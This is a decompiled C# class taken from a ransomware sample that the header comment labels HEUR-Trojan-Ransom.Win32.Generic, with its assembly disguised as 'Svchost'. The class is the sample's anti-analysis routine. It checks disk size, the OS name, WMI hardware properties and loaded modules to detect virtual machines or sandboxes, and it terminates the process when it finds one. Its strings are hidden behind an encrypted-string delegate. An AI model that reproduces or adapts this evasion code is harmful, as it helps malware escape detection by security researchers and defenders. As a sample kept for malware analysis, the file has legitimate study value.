// Decompiled with JetBrains decompiler
// Type: qYAjLWajCJpnf.bQSksvDvRWjEp
// Assembly: Svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9AAAE71-E61A-4958-B1A7-6590C53648E2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-8c723af5c826adea162ef3f2e37a1cca7b43d549c9a5fab7c9ff17f65eb5d8e7.exe

using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace qYAjLWajCJpnf
{
  internal sealed class bQSksvDvRWjEp
  {
    [NonSerialized]
    internal static GetString \u008B;

    public static void IiGHahHcjYnU()
    {
      if (bQSksvDvRWjEp.VRKXwtygBbHqE() || bQSksvDvRWjEp.bJfezlzlbDljpvh() || bQSksvDvRWjEp.RPMRBLwWErZDS() || bQSksvDvRWjEp.TbYBXXoAgXc())
        Process.GetCurrentProcess().Kill();
      Environment.FailFast((string) null);
    }

    private static bool RPMRBLwWErZDS()
    {
      try
      {
        long num = 61000000000;
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool TbYBXXoAgXc()
    {
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains(bQSksvDvRWjEp.\u008B(107460081)))
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool VRKXwtygBbHqE()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(bQSksvDvRWjEp.\u008B(107460076)))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject[bQSksvDvRWjEp.\u008B(107459995)].ToString().ToLower();
              if (lower == bQSksvDvRWjEp.\u008B(107460010) && managementBaseObject[bQSksvDvRWjEp.\u008B(107459469)].ToString().ToUpperInvariant().Contains(bQSksvDvRWjEp.\u008B(107459460)) || lower.Contains(bQSksvDvRWjEp.\u008B(107459415)) || managementBaseObject[bQSksvDvRWjEp.\u008B(107459469)].ToString() == bQSksvDvRWjEp.\u008B(107459438))
                return true;
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    private static bool bJfezlzlbDljpvh()
    {
      try
      {
        return bQSksvDvRWjEp.sNbHnNsBUFJEb(bQSksvDvRWjEp.\u008B(107459389)).ToInt32() != 0;
      }
      catch
      {
        return false;
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
    public static extern IntPtr sNbHnNsBUFJEb([In] string obj0);

    static bQSksvDvRWjEp() => Strings.CreateGetStringDelegate(typeof (bQSksvDvRWjEp));
  }
}
